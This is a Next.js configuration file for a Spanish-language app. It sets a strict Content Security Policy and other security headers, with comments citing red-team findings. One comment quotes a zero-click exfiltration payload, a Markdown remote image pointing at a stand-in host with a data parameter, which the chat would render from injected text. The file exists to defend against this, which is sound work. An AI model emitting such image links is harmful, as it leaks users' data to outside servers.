import type { NextConfig } from 'next'
import { INSTALACION } from './src/config/instalacion'
import { aplicarMarcador } from './src/lib/edicion'
import { CSP_CALLBACK, RUTA_CALLBACK } from './src/features/primer-arranque/lib/openrouter-pkce'

// Edición cliente (empaquetado del alumno, 11 oct 2026; docs/builds/empaquetado-2026-10-11/MAPA-WEB.md): se decide al
// construir con `ARBRAIN_EDICION=cliente` y se hornea para el navegador. Sin la variable, el build de siempre.
// Marcador (carril O, red team A3): la copia del alumno trae `arbrain/EDICION` = cliente; sin variable explícita, el
// marcador la fija aquí (y la heredan los workers de `next dev`/`next build`). El repo de Daniel no lo tiene.
aplicarMarcador()
const EDICION_CLIENTE = (process.env.ARBRAIN_EDICION ?? '').trim().toLowerCase() === 'cliente'

// CSP de las páginas en la edición cliente (la de Tauri solo cubre su pantalla de arranque). Lo que importa: la página no
// habla con ningún servidor fuera de sí misma (connect-src 'self' + el IPC de Tauri), no carga scripts ajenos ni plugins
// y no se deja enmarcar por otros. 'unsafe-inline' en scripts lo exigen el arranque de Next y el tema sin parpadeo.
// Red team 3 (A-5): ni imágenes ni marcos de `https:`. Una imagen remota en el Markdown era un canal de salida sin clic
// (`![](https://otro.sitio/?d=…)`); el chat las muestra como enlace (features/chat/lib/imagen-remota.ts).
const CSP_CLIENTE = [
  "default-src 'self'",
  "script-src 'self' 'unsafe-inline' 'wasm-unsafe-eval'",
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: blob:",
  "font-src 'self' data:",
  "media-src 'self' data: blob:",
  "connect-src 'self' ipc: http://ipc.localhost",
  "frame-src 'self' blob: data:",
  "worker-src 'self' blob:",
  "object-src 'none'",
  "base-uri 'self'",
  "form-action 'self'",
  "frame-ancestors 'self'",
].join('; ')

// Identidad del build (1 oct 2026): la app de escritorio carga la web del Studio (3300) y sin service
// worker en 127.0.0.1 no se enteraba de un deploy; se quedaba con el JS anterior hasta un Cmd+R.
// /api/version la expone y DesktopReloadShortcut recarga cuando cambia.
// Una sola identidad por build: `next build` evalúa este archivo en varios procesos (servidor y cliente
// compilan en workers aparte) y cada Date.now() salía distinto. /api/version nunca coincidía con el JS y
// la app recargaba en cada regreso a la ventana (medido el 1 oct: cliente «mupz037c», servidor «mupyzxaj»).
// Se fija en el entorno del proceso padre antes de que nazcan los workers, que lo heredan.
process.env.ARBRAIN_BUILD_ID ||= Date.now().toString(36)
const ARBRAIN_BUILD = process.env.ARBRAIN_BUILD_ID

const nextConfig: NextConfig = {
  // Modo servidor (`npm run servidor`, 21 oct 2026): solo dentro de la edición cliente y solo si el build lo pide.
  env: {
    NEXT_PUBLIC_ARBRAIN_BUILD: ARBRAIN_BUILD,
    NEXT_PUBLIC_ARBRAIN_EDICION: EDICION_CLIENTE ? 'cliente' : '',
    NEXT_PUBLIC_ARBRAIN_MODO_SERVIDOR: EDICION_CLIENTE && process.env.ARBRAIN_MODO_SERVIDOR === '1' ? '1' : '',
  },
  allowedDevOrigins: ["127.0.0.1"],
  devIndicators: false,
  output: 'standalone',
  outputFileTracingExcludes: {
    'next-server': [
      'src-tauri/**/*',
      '.git/**/*',
      'coverage/**/*',
      'server/node_modules/**/*',
      'server/dist/**/*',
      'server/store/**/*',
    ],
    '/*': [
      'src-tauri/**/*',
      '.git/**/*',
      'coverage/**/*',
      'server/node_modules/**/*',
      'server/dist/**/*',
      'server/store/**/*',
    ],
  },
  // Nota: el Segundo Cerebro NO empaqueta el corpus. La memoria/knowledge se lee
  // por ruta ABSOLUTA del filesystem del Mac (BUSINESS_OS_ROOT) en dev y desktop;
  // en web (Vercel) el repo no está montado y la superficie degrada con gracia.
  // (Un outputFileTracingIncludes con glob '../.claude/**' rompe el build de
  // Turbopack: no permite prefijos que salen del project root.)
  // Activa el MCP server en /_next/mcp (Next.js 16+). Edición cliente: apagado (red team 3, M-4: respondía sin auth).
  experimental: {
    mcpServer: !EDICION_CLIENTE,
    // Tree-shaking de barrels pesados (2 jul 2026, pase de fluidez desktop)
    optimizePackageImports: ['recharts', 'lucide-react', 'date-fns', '@fullcalendar/react'],
    // src/proxy.ts corre en TODA ruta de la API y Next clona el cuerpo para poder leerlo dos veces, pero solo
    // hasta 10 MB: lo demás se corta en silencio y la ruta recibe un cuerpo truncado («Failed to parse body as
    // FormData»). /api/storage/upload acepta archivos de 10 MB más el sobre multipart, así que el tope sube.
    proxyClientMaxBodySize: '25mb',
  },
  // Allow images from Supabase Storage (generated images, avatars, etc.)
  images: {
    remotePatterns: [
      {
        protocol: 'https',
        hostname: '**.supabase.co',
      },
      // Mission Control en el Studio (27 sep 2026): Storage local y su Funnel público (de config/instalacion.ts).
      ...(!EDICION_CLIENTE && INSTALACION.storageImagenes ? [INSTALACION.storageImagenes] : []),
      { protocol: 'http', hostname: 'localhost', port: '8000' },
    ],
  },
  async redirects() {
    return [
      { source: '/draw2', destination: '/draw3', permanent: true },
      { source: '/draw2/:id', destination: '/draw3/:id', permanent: true },
    ]
  },
  async headers() {
    const allowDesktopEmbed =
      process.env.MISSION_CONTROL_DESKTOP_EMBED === '1' ||
      process.env.NODE_ENV === 'development'
    const securityHeaders = [
      ...(allowDesktopEmbed
        ? []
        // SAMEORIGIN (no DENY): las hojas HTML del canvas embeben paginas
        // propias en iframe same-origin; DENY las dejaba en blanco (2 jul 2026).
        : [{ key: 'X-Frame-Options', value: 'SAMEORIGIN' }]),
      { key: 'X-Content-Type-Options', value: 'nosniff' },
      { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
      // Edición cliente (seguridad noche 21 oct): sin resolución anticipada de enlaces que un texto inyectado pudo armar.
      { key: 'X-DNS-Prefetch-Control', value: EDICION_CLIENTE ? 'off' : 'on' },
      ...(EDICION_CLIENTE ? [{ key: 'Content-Security-Policy', value: CSP_CLIENTE }, { key: 'Permissions-Policy', value: 'camera=(), geolocation=(), payment=(), usb=()' }] : []),
      // Sin Supabase (edición cliente) no hay a qué precalentar la conexión.
      ...(process.env.NEXT_PUBLIC_SUPABASE_URL ? [{ key: 'Link', value: `<${process.env.NEXT_PUBLIC_SUPABASE_URL}>; rel=preconnect` }] : []),
    ]
    // Caché de las caras (5 oct 2026). Next sirve public/ con max-age=0: cada carga del chat revalidaba cada
    // imagen, una ida y vuelta por archivo por Funnel. Lo que lleva versión en el nombre (retratos `.v1.` de
    // scripts/retratos.sh y los glb `-nNN`) no cambia nunca: inmutable. El rig 2D tiene nombres fijos que sus
    // herramientas reescriben: un día y, pasado, se sirve lo guardado mientras se revalida en segundo plano.
    const inmutable = [{ key: 'Cache-Control', value: 'public, max-age=31536000, immutable' }]
    const unDia = [{ key: 'Cache-Control', value: 'public, max-age=86400, stale-while-revalidate=2592000' }]
    return [
      {
        source: '/(.*)',
        headers: securityHeaders,
      },
      { source: '/retratos/:archivo*', headers: inmutable },
      { source: '/levy-3d/:archivo([^/]+\\.glb)', headers: inmutable },
      { source: '/agentes-3d/:archivo([^/]+\\.glb)', headers: inmutable },
      { source: '/levy-face/:ruta*', headers: unDia },
      { source: '/agentes-2d/:ruta*', headers: unDia },
      { source: '/agentes-3d/:archivo([^/]+\\.jpg)', headers: unDia },
      // Regreso de OpenRouter (red team OAuth, B1): DESPUÉS de `/(.*)` para que sus claves ganen («la última gana») y
      // la respuesta real lleve la CSP estricta, sin Referer y sin marcos, no las generales del cliente.
      ...(EDICION_CLIENTE ? [{
        source: RUTA_CALLBACK,
        headers: [
          { key: 'Content-Security-Policy', value: CSP_CALLBACK },
          { key: 'Referrer-Policy', value: 'no-referrer' },
          { key: 'X-Frame-Options', value: 'DENY' },
          { key: 'Cache-Control', value: 'no-store' },
        ],
      }] : []),
    ]
  },
}

export default nextConfig
